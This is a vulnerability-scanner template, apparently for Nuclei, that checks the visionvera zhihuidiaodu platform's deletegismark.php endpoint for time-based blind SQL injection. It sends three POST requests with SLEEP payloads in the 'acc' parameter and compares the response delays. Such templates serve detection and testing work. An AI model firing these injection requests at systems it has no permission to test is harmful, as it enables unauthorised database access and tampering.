id: visionvera-zhihuidiaodu-deletegismark-php-sqli

info:
  name: visionvera zhihuidiaodu deletegismark.php SQL注入漏洞
  author: bl
  severity: high
  tags: 指挥调度管理平台
  description: |-
    本模板针对 visionvera zhihuidiaodu 的 deletegismark.php 端点进行 SQL 注入漏洞检测。攻击者可利用该接口构造恶意 SQL 语句，干扰数据库查询逻辑，进而实现未授权数据访问或篡改。具体影响取决于目标环境版本、部署配置及接口暴露范围。
  remediation: >-
    所有数据库访问均应使用参数化查询或安全的 ORM，按照允许列表校验输入，并为应用配置最小权限的数据库账号。升级到厂商已修复的版本，在完成修复前限制对受影响端点的访问。
  
variables:
  rand: '{{rand_int(10000, 99999)}}'
  randSecond1: '{{rand_int(6, 7)}}'
  randSecond2: '{{rand_int(2, 3)}}'

flow: http(1) && http(2) && http(3)

http:
  - method: POST
    path:
      - '{{BaseURL}}/api/client/deletegismark.php'
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: acc={{rand}}'%20AND%20(SELECT%205443%20FROM%20(SELECT(SLEEP(0)))FIjE)--+-&id={{rand}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
        internal: true
      - type: word
        words:
          - "{\"result\":\"0\"}"
        part: body
        internal: true
  - method: POST
    path:
      - '{{BaseURL}}/api/client/deletegismark.php'
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: acc={{rand}}'%20AND%20(SELECT%205443%20FROM%20(SELECT(SLEEP({{randSecond1}})))FIjE)--+-&id={{rand}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
        internal: true
      - type: dsl
        dsl:
          - duration - duration_1 >= randSecond1 * 1 - 0.5
        condition: and
        internal: true
  - method: POST
    path:
      - '{{BaseURL}}/api/client/deletegismark.php'
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: acc={{rand}}'%20AND%20(SELECT%205443%20FROM%20(SELECT(SLEEP({{randSecond2}})))FIjE)--+-&id={{rand}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - duration - duration_1 >= randSecond2 * 1 - 0.5
        condition: and
